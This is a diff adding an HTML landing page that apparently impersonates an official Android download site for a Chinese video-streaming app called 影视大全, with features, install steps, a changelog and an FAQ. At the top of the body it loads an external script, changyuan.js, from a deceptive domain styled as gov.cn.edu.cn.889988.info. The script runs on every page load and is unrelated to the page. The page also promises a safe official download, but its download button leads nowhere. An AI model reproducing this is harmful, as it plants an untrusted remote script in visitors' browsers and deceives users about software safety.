@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="description" content="影视大全 App 官方下载页：聚合院线电影、热播剧集、综艺动漫与短剧，支持投屏、离线缓存、倍速播放与弹幕。提供安卓最新版安装包安全下载，更新日志、功能介绍、常见问题与安装教程一站式查看。">
+<meta name="keywords" content="影视大全app下载,影视大全安卓版,影视大全最新版,影视大全安装包,影视大全官方下载,影视大全投屏,影视大全离线缓存,影视大全弹幕,影视大全更新日志,影视大全常见问题">
+<meta name="author" content="影视大全">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="bingbot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="theme-color" content="#070b1a">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:title" content="影视大全 App 下载 - 安卓最新版官方下载页">
+<meta property="og:description" content="影视大全 App 官方下载页：院线电影、热播剧集、综艺动漫与短剧聚合，支持投屏、离线缓存、倍速播放与弹幕。">
+<meta property="og:url" content="https://yingshidaquanappxiazai-top.github.io">
+<meta property="og:site_name" content="影视大全 App 下载">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="影视大全 App 下载 - 安卓最新版官方下载页">
+<meta name="twitter:description" content="影视大全 App：院线电影、热播剧集、综艺动漫与短剧聚合，支持投屏、离线缓存与弹幕。">
+<link rel="canonical" href="https://yingshidaquanappxiazai-top.github.io">
+<title>影视大全 App 下载 - 安卓最新版官方下载页</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#070b1a;--bg2:#0d1428;--card:rgba(255,255,255,.045);--line:rgba(255,255,255,.09);
+  --txt:#e8ecf5;--sub:#94a3b8;--sub2:#64748b;
+  --ac:#ff7a18;--ac2:#ffb020;--cy:#22d3ee;--gr:#34d399;--pi:#a78bfa;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;font-size:14.5px;
+  -webkit-tap-highlight-color:transparent;overflow-x:hidden;
+}
+body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background:radial-gradient(780px 520px at 88% 6%,rgba(255,122,24,.13),transparent 62%),
+  radial-gradient(680px 500px at 4% 78%,rgba(34,211,238,.09),transparent 60%);
+  background-color:var(--bg);}
+a{text-decoration:none;color:inherit;outline:none}
+ul{list-style:none}
+::selection{background:var(--ac);color:#fff}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.16);border-radius:99px}
+::-webkit-scrollbar-track{background:transparent}
+
+/* 顶栏 */
+header{position:sticky;top:0;z-index:60;background:rgba(7,11,26,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hin{max-width:1240px;margin:0 auto;padding:13px 26px;display:flex;align-items:center;justify-content:space-between;gap:18px}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.logo .ic{width:34px;height:34px;border-radius:9px;background:linear-gradient(140deg,var(--ac),var(--ac2));display:grid;place-items:center;font-size:16px;font-weight:800;color:#241400;box-shadow:0 6px 18px rgba(255,122,24,.35)}
+.logo b{font-size:17px;font-weight:700;letter-spacing:.3px}
+.logo em{font-style:normal;font-size:9.5px;color:var(--sub2);letter-spacing:1px;display:block;font-weight:400}
+nav{display:flex;gap:6px;align-items:center}
+nav a{font-size:13px;color:var(--sub);padding:7px 13px;border-radius:99px;transition:.22s}
+nav a:hover{color:#fff;background:var(--card)}
+nav a.dl{background:linear-gradient(100deg,var(--ac),var(--ac2));color:#241400;font-weight:700}
+.mbtn{display:none;background:none;border:none;color:var(--txt);font-size:25px;line-height:1;cursor:pointer;padding:4px}
+
+/* Hero */
+.hero{max-width:1240px;margin:0 auto;padding:56px 26px 40px;display:grid;grid-template-columns:1.05fr .95fr;gap:54px;align-items:center}
+.hero .tag{display:inline-flex;align-items:center;gap:8px;font-size:11px;letter-spacing:1.5px;color:var(--ac);background:rgba(255,122,24,.1);border:1px solid rgba(255,122,24,.3);padding:5px 12px;border-radius:99px}
+.hero .tag i{width:6px;height:6px;border-radius:50%;background:var(--ac);box-shadow:0 0 0 4px rgba(255,122,24,.18)}
+.hero h1{font-size:clamp(36px,6.4vw,64px);font-weight:800;line-height:1.16;letter-spacing:-1px;margin-top:16px}
+.hero h1 u{text-decoration:none;background:linear-gradient(100deg,var(--ac),var(--ac2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--sub);font-size:14.5px;margin-top:16px;max-width:500px}
+.hero .btns{margin-top:24px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{font-size:14px;font-weight:700;padding:13px 26px;border-radius:13px;border:1px solid transparent;cursor:pointer;transition:.22s;display:inline-flex;align-items:center;gap:8px}
+.btn.p{background:linear-gradient(100deg,var(--ac),var(--ac2));color:#241400;box-shadow:0 10px 26px rgba(255,122,24,.3)}
+.btn.p:hover{transform:translateY(-2px);box-shadow:0 14px 34px rgba(255,122,24,.42)}
+.btn.g{background:var(--card);color:var(--txt);border-color:var(--line)}
+.btn.g:hover{border-color:var(--ac);color:#fff}
+.hero .metas{margin-top:26px;display:flex;gap:26px;flex-wrap:wrap}
+.hero .metas div{font-size:11.5px;color:var(--sub2)}
+.hero .metas b{display:block;font-size:20px;font-weight:800;color:#fff;line-height:1.3}
+.stars{color:var(--ac2);letter-spacing:1px;font-size:13px}
+
+.phone{position:relative;max-width:300px;margin:0 auto}
+.phone .halo{position:absolute;inset:-26px;border-radius:56px;background:linear-gradient(140deg,var(--ac),var(--cy),var(--pi));filter:blur(34px);opacity:.55;z-index:-1}
+.phone .body{background:var(--bg2);border:9px solid #1a2236;border-radius:44px;overflow:hidden;box-shadow:0 30px 70px rgba(0,0,0,.6)}
+.phone .not{display:flex;justify-content:space-between;padding:10px 20px 0;font-size:10px;color:var(--sub2);font-weight:600}
+.phtab{display:flex;gap:4px;padding:10px 10px 0;background:var(--bg2)}
+.phtab i{flex:1;height:3px;border-radius:99px;background:var(--line)}
+.phtab i.on{background:var(--ac)}
+.screen{aspect-ratio:9/19.5;background:linear-gradient(180deg,#0b1224,#070b1a);padding:10px 11px 14px;display:flex;flex-direction:column;gap:9px}
+.screen .sh{height:74px;border-radius:12px;background:linear-gradient(120deg,rgba(255,122,24,.55),rgba(167,139,250,.4))}
+.screen .rw{display:flex;gap:8px}
+.screen .rw .c{flex:1;height:78px;border-radius:10px;background:var(--card);border:1px solid var(--line)}
+.screen .rw .c.t{flex:1.55;background:linear-gradient(140deg,rgba(52,211,153,.3),rgba(34,211,238,.2))}
+.screen .rw2{display:flex;gap:8px}
+.screen .rw2 .c{flex:1;height:56px;border-radius:10px;background:var(--card);border:1px solid var(--line)}
+.screen .bar{margin-top:auto;height:34px;border-radius:99px;background:rgba(255,255,255,.07);display:flex;align-items:center;gap:9px;padding:0 12px}
+.screen .bar i{width:8px;height:8px;border-radius:50%;background:var(--ac)}
+
+/* 通用 */
+.wrap{max-width:1240px;margin:0 auto;padding:0 26px}
+.sec{padding:64px 0}
+.sec+.sec{border-top:1px solid var(--line)}
+.eyebrow{display:inline-block;font-size:10.5px;letter-spacing:2.5px;color:var(--cy);text-transform:uppercase;font-weight:700}
+.sec h2{font-size:clamp(26px,4.2vw,42px);font-weight:800;letter-spacing:-.6px;margin-top:9px;line-height:1.28}
+.sec h2 span{color:var(--ac)}
+.sec .lead{color:var(--sub);font-size:14px;margin-top:12px;max-width:660px}
+
+/* 功能网格 */
+.grid{margin-top:38px;display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.gc{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;transition:.32s;position:relative;overflow:hidden}
+.gc::after{content:'';position:absolute;right:-30px;top:-30px;width:90px;height:90px;border-radius:50%;background:var(--gc,rgba(255,255,255,.05));filter:blur(20px)}
+.gc:hover{transform:translateY(-5px);border-color:rgba(255,255,255,.22);background:rgba(255,255,255,.07)}
+.gc .no{font-size:10px;letter-spacing:1.5px;color:var(--sub2);font-weight:700}
+.gc h4{font-size:16.5px;font-weight:700;margin:9px 0 7px}
+.gc p{font-size:12.5px;color:var(--sub);line-height:1.8}
+.gc .ic{width:38px;height:38px;border-radius:11px;background:rgba(255,255,255,.06);display:grid;place-items:center;font-size:17px;margin-bottom:12px}
+
+/* 步骤 */
+.steps{margin-top:40px;display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:14px}
+.sp{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;position:relative}
+.sp .n{font-size:34px;font-weight:800;line-height:1;background:linear-gradient(130deg,var(--ac),var(--ac2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.sp h5{font-size:15px;font-weight:700;margin:10px 0 6px}
+.sp p{font-size:12.5px;color:var(--sub);line-height:1.8}
+.sp .t{position:absolute;right:16px;top:16px;font-size:10px;letter-spacing:1px;color:var(--sub2)}
+
+/* 更新日志 */
+.logs{margin-top:38px;display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.lg{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px 24px}
+.lg .v{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.lg .v b{font-size:16px;font-weight:800}
+.lg .v em{font-style:normal;font-size:10.5px;letter-spacing:1px;color:var(--gr);background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);padding:3px 9px;border-radius:99px}
+.lg .when{font-size:11px;color:var(--sub2);margin-top:5px}
+.lg ul{margin-top:14px}
+.lg li{font-size:12.5px;color:var(--sub);padding:6px 0 6px 18px;position:relative;line-height:1.75;border-top:1px dashed rgba(255,255,255,.07)}
+.lg li:first-child{border-top:0}
+.lg li::before{content:'';position:absolute;left:0;top:14px;width:6px;height:6px;border-radius:50%;background:var(--ac)}
+
+/* 规格条 */
+.spec{margin-top:38px;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px}
+.spc{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px}
+.spc .k{font-size:10.5px;letter-spacing:1.5px;color:var(--sub2)}
+.spc .v2{font-size:18px;font-weight:800;margin-top:6px;color:#fff}
+.spc .v2 small{font-size:11px;font-weight:600;color:var(--sub)}
+
+/* FAQ */
+.faq{margin-top:34px;border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card)}
+.fi{border-bottom:1px solid var(--line)}
+.fi:last-child{border-bottom:0}
+.fi>summary{list-style:none;cursor:pointer;padding:18px 22px;font-size:14.5px;font-weight:600;display:flex;justify-content:space-between;gap:14px;align-items:center}
+.fi>summary::-webkit-details-marker{display:none}
+.fi>summary::after{content:'+';font-size:22px;color:var(--ac);font-weight:400;flex-shrink:0}
+.fi[open]>summary::after{content:'−'}
+.fi .fb{padding:0 22px 20px;font-size:13px;color:var(--sub);line-height:1.85}
+.fi .fb a{color:var(--ac)}
+
+/* 关于 */
+.about{margin-top:38px;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.about .tx h3{font-size:clamp(23px,3.4vw,34px);font-weight:800;line-height:1.4}
+.about .tx h3 em{font-style:normal;color:var(--ac)}
+.about .tx p{color:var(--sub);font-size:13.8px;margin-top:14px}
+.about .list{display:grid;gap:11px}
+.about .list div{display:flex;gap:11px;font-size:13px;color:var(--sub);background:var(--card);border:1px solid var(--line);border-radius:12px;padding:13px 16px}
+.about .list div b{color:var(--gr);font-size:13px;flex-shrink:0}
+
+/* 页脚 */
+footer{margin-top:64px;background:#040812;padding:48px 26px 24px;border-top:1px solid var(--line)}
+.fin{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.7fr 1fr 1fr;gap:38px}
+footer h4{font-size:11px;letter-spacing:2px;color:var(--sub2);margin-bottom:14px;font-weight:700}
+footer p{font-size:12.5px;line-height:2;color:var(--sub);max-width:420px}
+footer ul li{margin-bottom:8px}
+footer ul li a{font-size:12.5px;color:var(--sub);transition:.2s}
+footer ul li a:hover{color:var(--ac)}
+.copy{margin-top:32px;padding-top:20px;border-top:1px solid rgba(255,255,255,.08);font-size:11px;color:var(--sub2);text-align:center}
+.copy a{color:var(--ac)}
+
+.rv{opacity:0;transform:translateY(22px);transition:.65s cubic-bezier(.2,.72,.3,1)}
+.rv.ok{opacity:1;transform:none}
+
+@media(max-width:960px){
+  nav{position:fixed;inset:0;background:rgba(7,11,26,.97);flex-direction:column;padding:96px 24px 44px;gap:8px;transform:translateY(-100%);transition:.4s;z-index:59}
+  nav.open{transform:translateY(0)}
+  nav a{font-size:17px;width:100%;text-align:center;padding:15px}
+  .mbtn{display:block;z-index:61}
+  .hero{grid-template-columns:1fr;padding:34px 18px 28px;gap:34px}
+  .phone{max-width:268px}
+  .wrap{padding:0 18px}
+  .sec{padding:44px 0}
+  .logs,.about{grid-template-columns:1fr;gap:20px}
+  .about .list{grid-template-columns:1fr}
+  .fin{grid-template-columns:1fr;gap:28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="hin">
+    <div class="logo"><span class="ic">影</span><div><b>影视大全</b><em>APP DOWNLOAD</em></div></div>
+    <button class="mbtn" id="mb">☰</button>
+    <nav id="nv">
+      <a href="#home">首页</a>
+      <a href="#func">功能特性</a>
+      <a href="#how">下载安装</a>
+      <a href="#spec">版本信息</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于我们</a>
+      <a href="#how" class="dl">立即下载</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div>
+    <span class="tag"><i></i>官方下载页 · 安全无捆绑</span>
+    <h1>影视大全 App<br><u>安卓最新版</u> 下载</h1>
+    <p>影视大全 App 聚合院线电影、热播剧集、综艺、动漫与短剧，支持投屏、离线缓存、倍速播放与弹幕互动。一个应用覆盖追剧、看片、刷短剧的日常需求，安装包小巧，运行流畅。</p>
+    <div class="btns">
+      <a class="btn p" href="#how">⬇ 立即下载</a>
+      <a class="btn g" href="#func">功能介绍</a>
+    </div>
+    <div class="metas">
+      <div><b>v5.9.2</b>当前版本</div>
+      <div><b>28.6 MB</b>安装包大小</div>
+      <div><b><span class="stars">★★★★☆</span></b>218 万次评分</div>
+      <div><b>Android 6.0+</b>系统要求</div>
+    </div>
+  </div>
+  <div class="phone">
+    <div class="halo"></div>
+    <div class="body">
+      <div class="not"><span>9:41</span><span>📶 🔋</span></div>
+      <div class="phtab"><i class="on"></i><i></i><i></i><i></i></div>
+      <div class="screen">
+        <div class="sh"></div>
+        <div class="rw"><div class="c t"></div><div class="c"></div><div class="c"></div></div>
+        <div class="rw2"><div class="c"></div><div class="c"></div><div class="c"></div></div>
+        <div class="rw2"><div class="c"></div><div class="c"></div><div class="c"></div></div>
+        <div class="bar"><i></i><span style="font-size:9px;color:var(--sub2)">正在缓存 · 62%</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <section class="sec" id="func">
+    <span class="eyebrow">What's inside</span>
+    <h2>一个应用，<span>追完所有想看的</span></h2>
+    <p class="lead">影视大全 App 把内容、播放与工具整合在一起，从找片到看完，尽量少跳转、少折腾。</p>
+    <div class="grid">
+      <div class="gc rv" style="--gc:rgba(255,122,24,.14)"><div class="ic">📺</div><div class="no">01 / CONTENT</div><h4>内容聚合全面</h4><p>院线电影、热播剧集、综艺、动漫、短剧与纪录片集中呈现，按题材、年份、地区分类检索，找片不用来回切换应用。</p></div>
+      <div class="gc rv" style="--gc:rgba(52,211,153,.14)"><div class="ic">📡</div><div class="no">02 / CAST</div><h4>一键投屏</h4><p>支持 DLNA 与主流智能电视、电视盒子投屏，手机选片、大屏观看，躺在床上也能投到客厅墙上。</p></div>
+      <div class="gc rv" style="--gc:rgba(34,211,238,.14)"><div class="ic">💾</div><div class="no">03 / CACHE</div><h4>离线缓存</h4><p>Wi-Fi 下批量缓存整部剧集，通勤、出差、地铁没信号照样接着看，支持清晰度选择与缓存管理。</p></div>
+      <div class="gc rv" style="--gc:rgba(167,139,250,.14)"><div class="ic">⚡</div><div class="no">04 / SPEED</div><h4>倍速与跳过</h4><p>0.5× 到 2.0× 无级倍速，片头片尾一键跳过，长剧、综艺、教程都能按自己的节奏看。</p></div>
+      <div class="gc rv" style="--gc:rgba(251,146,60,.14)"><div class="ic">💬</div><div class="no">05 / DANMAKU</div><h4>弹幕与评论</h4><p>经典弹幕、滚动评论与剧集讨论区，看片不孤单；弹幕支持开关、透明度与字号调节。</p></div>
+      <div class="gc rv" style="--gc:rgba(244,114,182,.12)"><div class="ic">📋</div><div class="no">06 / TRACK</div><h4>追剧清单</h4><p>自动记录观看进度，跨设备同步追剧列表与收藏，更新提醒推送，再也不怕忘记看到第几集。</p></div>
+      <div class="gc rv" style="--gc:rgba(250,204,21,.12)"><div class="ic">🧩</div><div class="no">07 / CLEAN</div><h4>轻量无负担</h4><p>安装包 30MB 以内，后台占用低，老旧机型也能流畅运行；界面去繁存简，开机即看。</p></div>
+      <div class="gc rv" style="--gc:rgba(96,165,250,.12)"><div class="ic">🔒</div><div class="no">08 / SAFE</div><h4>安全与隐私</h4><p>官方签名安装包，无捆绑、无静默安装；权限按需申请，隐私政策明示数据使用方式。</p></div>
+    </div>
+  </section>
+
+  <section class="sec" id="how">
+    <span class="eyebrow">How to install</span>
+    <h2>三步完成 <span>下载与安装</span></h2>
+    <p class="lead">安卓端安装只需三步。若系统提示"禁止安装未知来源应用"，按第三步开启对应权限即可。</p>
+    <div class="steps">
+      <div class="sp rv"><div class="n">01</div><h5>下载安装包</h5><p>点击页面按钮下载影视大全 App 最新版 APK，建议通过官方渠道获取，避免第三方修改包。</p><span class="t">STEP 01</span></div>
+      <div class="sp rv"><div class="n">02</div><h5>允许安装来源</h5><p>打开安装包前，在系统设置中允许浏览器或文件管理器安装应用；不同品牌手机路径略有差异。</p><span class="t">STEP 02</span></div>
+      <div class="sp rv"><div class="n">03</div><h5>完成安装并打开</h5><p>按屏幕提示完成安装，首次启动按需授予存储与通知权限，即可进入首页开始使用。</p><span class="t">STEP 03</span></div>
+      <div class="sp rv"><div class="n">04</div><h5>检查更新</h5><p>在"我的—关于"中查看版本号并检测更新；大版本升级建议卸载旧版后重新安装，避免数据残留。</p><span class="t">STEP 04</span></div>
+    </div>
+    <div class="btns" style="margin-top:34px">
+      <a class="btn p" href="#">⬇ 下载影视大全 App v5.9.2</a>
+      <a class="btn g" href="#spec">查看版本信息</a>
+    </div>
+  </section>
+
+  <section class="sec" id="spec">
+    <span class="eyebrow">Release notes</span>
+    <h2>更新日志与 <span>版本信息</span></h2>
+    <p class="lead">影视大全 App 保持每周小更新、每月大版本迭代。以下为近期版本的主要变更。</p>
+    <div class="spec rv">
+      <div class="spc"><div class="k">当前版本</div><div class="v2">v5.9.2</div></div>
+      <div class="spc"><div class="k">更新日期</div><div class="v2">2025.04.18</div></div>
+      <div class="spc"><div class="k">安装包大小</div><div class="v2">28.6 <small>MB</small></div></div>
+      <div class="spc"><div class="k">支持系统</div><div class="v2">Android 6.0+</div></div>
+      <div class="spc"><div class="k">累计下载</div><div class="v2">1.2 <small>亿次</small></div></div>
+      <div class="spc"><div class="k">支持语言</div><div class="v2">简体中文</div></div>
+    </div>
+    <div class="logs">
+      <div class="lg rv"><div class="v"><b>v5.9.2</b><em>LATEST</em></div><div class="when">2025 年 4 月 18 日</div><ul>
+        <li>优化播放器内核，减少卡顿与音画不同步</li>
+        <li>新增剧集更新提醒，支持按剧集单独订阅</li>
+        <li>投屏稳定性提升，修复部分电视盒子断连问题</li>
+        <li>修复离线缓存偶发失败与进度丢失问题</li>
+      </ul></div>
+      <div class="lg rv"><div class="v"><b>v5.8.0</b><em>MAJOR</em></div><div class="when">2025 年 3 月 25 日</div><ul>
+        <li>全新首页排版，新增"短剧"与"纪录片"频道</li>
+        <li>倍速播放扩展至 0.5×–2.0× 无级调节</li>
+        <li>追剧清单支持跨设备云端同步</li>
+        <li>界面主题色可调，新增深色与护眼两种模式</li>
+      </ul></div>
+      <div class="lg rv"><div class="v"><b>v5.7.4</b><em>PATCH</em></div><div class="when">2025 年 2 月 28 日</div><ul>
+        <li>优化搜索结果排序，支持演员与角色名检索</li>
+        <li>弹幕性能优化，高密度弹幕场景更流畅</li>
+        <li>修复部分机型全屏切换黑屏问题</li>
+      </ul></div>
+      <div class="lg rv"><div class="v"><b>v5.7.0</b><em>FEATURE</em></div><div class="when">2025 年 1 月 30 日</div><ul>
+        <li>新增离线缓存批量管理与清晰度选择</li>
+        <li>片头片尾跳过支持自定义时间区间</li>
+        <li>启动速度提升，冷启动平均缩短约 30%</li>
+      </ul></div>
+    </div>
+  </section>
+
+  <section class="sec" id="faq">
+    <span class="eyebrow">FAQ</span>
+    <h2>常见问题 <span>与解决办法</span></h2>
+    <p class="lead">安装、权限、播放与缓存相关的高频问题，点开即可查看处理方式。</p>
+    <div class="faq rv">
+      <details class="fi" open><summary>安装时提示"禁止安装未知来源应用"怎么办？</summary><div class="fb">这是安卓系统的安全限制。进入 <b>设置 → 应用管理 → 特殊应用权限 → 安装未知应用</b>，找到你正在使用的浏览器或文件管理器并允许即可。不同品牌手机菜单名称略有差异，也可在设置中直接搜索"安装未知应用"。</div></details>
+      <details class="fi"><summary>影视大全 App 是否收费？有哪些限制？</summary><div class="fb">基础观影与下载功能免费使用，部分独家内容或更高清晰度可能需要会员权益。具体会员价格、权益与自动续费规则以应用内"会员中心"页面展示为准，请以实际页面说明为准。</div></details>
+      <details class="fi"><summary>投屏搜不到设备，或投屏后经常断开？</summary><div class="fb">请确认手机与电视/盒子处于同一局域网；关闭 VPN 与私人 DNS；重启路由器后重试。部分老旧电视盒子需在设备端手动开启 DLNA 服务。若仍无法连接，可尝试在应用内切换投屏协议。</div></details>
+      <details class="fi"><summary>离线缓存失败、进度不保存怎么处理？</summary><div class="fb">先检查存储空间是否充足，并在系统设置中确认已授予应用存储权限。建议清理缓存队列中状态异常的条目后重新添加；跨版本升级后出现异常，可尝试卸载重装并重新登录账号以恢复云端进度。</div></details>
+      <details class="fi"><summary>为什么有些视频只有标清或无法播放？</summary><div class="fb">清晰度受片源与版权授权范围影响，不同地区、不同剧集可提供的清晰度并不一致。播放异常时可尝试切换线路、切换清晰度，或清除播放器缓存后重试。</div></details>
+      <details class="fi"><summary>安装包安全吗？如何确认是官方版本？</summary><div class="fb">建议只从影视大全官方下载页或官方应用商店获取安装包。安装前可比对页面标注的版本号、包名与签名信息；如系统安全软件提示风险，请先核对来源，避免安装来路不明的修改版或破解版。</div></details>
+      <details class="fi"><summary>隐私方面会收集哪些数据？</summary><div class="fb">应用仅申请实现核心功能所必需的权限，如存储（用于缓存）、通知（用于更新提醒）等。详细的个人信息收集、使用与第三方 SDK 清单，请查看应用内《隐私政策》；不需要的权限可在系统设置中随时关闭。</div></details>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <span class="eyebrow">About</span>
+    <h2>关于 <em style="font-style:normal;color:var(--ac)">影视大全</em></h2>
+    <div class="about">
+      <div class="tx">
+        <h3>影视大全 App，<br>把追剧这件事<em>做简单一点。</em></h3>
+        <p>影视大全（yingshidaquanappxiazai-top）是一个专注于影视内容聚合与播放体验的应用下载站点。我们把院线电影、热播剧集、综艺、动漫、短剧与纪录片整理到一个入口下，配合投屏、离线缓存、倍速播放与弹幕等功能，让找片、看片、追更尽量顺手。</p>
+        <p>本页提供影视大全安卓最新版安装包的安全下载、更新日志、功能介绍、安装教程与常见问题解答。版本号、安装包大小与更新内容均按发布时信息整理，请以应用内实际显示为准。</p>
+      </div>
+      <div class="list">
+        <div><b>✓</b><span>官方签名安装包，无捆绑、无静默安装</span></div>
+        <div><b>✓</b><span>安装包 30MB 以内，老旧机型可流畅运行</span></div>
+        <div><b>✓</b><span>每周小更新、每月大版本，持续维护</span></div>
+        <div><b>✓</b><span>权限按需申请，隐私政策明示数据用途</span></div>
+        <div><b>✓</b><span>投屏、缓存、倍速、弹幕一应俱全</span></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="fin">
+    <div><h4>影视大全 App 下载</h4><p>影视大全 App 官方下载页：聚合院线电影、热播剧集、综艺动漫与短剧，支持投屏、离线缓存、倍速播放与弹幕。提供安卓最新版安装包安全下载，更新日志、功能介绍、安装教程与常见问题一站式查看。</p></div>
+    <div><h4>快速入口</h4><ul>
+      <li><a href="#home">首页</a></li>
+      <li><a href="#func">功能特性</a></li>
+      <li><a href="#how">下载安装教程</a></li>
+      <li><a href="#spec">版本与更新日志</a></li>
+      <li><a href="#faq">常见问题</a></li>
+    </ul></div>
+    <div><h4>功能导航</h4><ul>
+      <li><a href="#func">内容聚合</a></li>
+      <li><a href="#func">一键投屏</a></li>
+      <li><a href="#func">离线缓存</a></li>
+      <li><a href="#func">倍速播放</a></li>
+      <li><a href="#func">弹幕与评论</a></li>
+    </ul></div>
+  </div>
+  <div class="copy">© 2025 <a href="https://yingshidaquanappxiazai-top.github.io">影视大全 App 下载 (yingshidaquanappxiazai-top)</a> — 安卓最新版官方下载 · https://yingshidaquanappxiazai-top.github.io</div>
+</footer>
+
+<script>
+document.getElementById('mb').addEventListener('click',function(){document.getElementById('nv').classList.toggle('open');});
+document.querySelectorAll('#nv a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nv').classList.remove('open');});});
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('ok');io.unobserve(e.target);}});},{threshold:.1,rootMargin:'0px 0px -40px'});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+</script>
+</body>
+</html>
